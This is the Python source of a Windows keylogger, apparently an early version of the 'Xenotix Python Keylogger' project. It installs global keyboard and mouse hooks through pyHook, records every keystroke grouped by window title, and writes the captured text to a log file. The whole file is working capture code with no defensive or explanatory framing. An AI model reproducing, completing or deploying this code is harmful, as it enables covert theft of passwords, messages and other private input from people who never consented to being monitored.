import pythoncom, pyHook
import sys
import os


debug = False

if os.path.isfile('E:\Github\Xenotix-Python-Keylogger\log.txt'):
    os.remove('E:\Github\Xenotix-Python-Keylogger\log.txt')

windows = {} #{'id': {'name':'Window Name':'keystrokes':'blahblah'}}


def OnMouseEvent(event):

    global windows

    ############ 
    #variables from pyHook event

    current_window = {}
    current_window = {event.Window : {'name': event.WindowName, 'keystrokes': ''}}
    
    ############

    # Check if window exists
    if event.Window not in windows:        
        windows.update(current_window)
        print "Caliing this"


    print windows

def OnKeyboardEvent(event):

    global windows

    ############ 
    #variables from pyHook event
    
    keystroke = event.Key if event.Ascii <= 33 else chr(event.Ascii)
    replace_keystroke = {'0': 'char(0)', 'Return' : '[Enter]\n','Space': ' ', 'Lshift': '[SHIFT]', 'Rshift': '[SHIFT]', 'Lcontrol': '[Ctrl]', 'Rcontrol':'[Ctrl]'}

    if keystroke in replace_keystroke:
        keystroke = replace_keystroke[keystroke]


    current_window = {}
    current_window[event.Window] = {'name': event.WindowName, 'keystrokes': keystroke}

    ############

    
    # Check if window exists
    if event.Window not in windows:        
        windows.update(current_window)
    else:
        windows[event.Window]['keystrokes'] = windows[event.Window]['keystrokes'] + keystroke 

    if event.Key == "P":
        create_log(windows)       
        exit()
    # return True to pass the event to other handlers
    return True


def create_log(windows):
    log = ''
    for window_id in windows:
        log += "==================== {window} ====================\r {keystrokes} \r".format(window=windows[window_id]['name'],keystrokes=windows[window_id]['keystrokes'])
    with open('log.txt','ab') as file:
        file.write(log)
        

   
# return True to pass the event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()

hm.MouseLeftDown = OnMouseEvent
hm.KeyDown = OnKeyboardEvent

hm.HookKeyboard()
hm.HookMouse()

pythoncom.PumpMessages()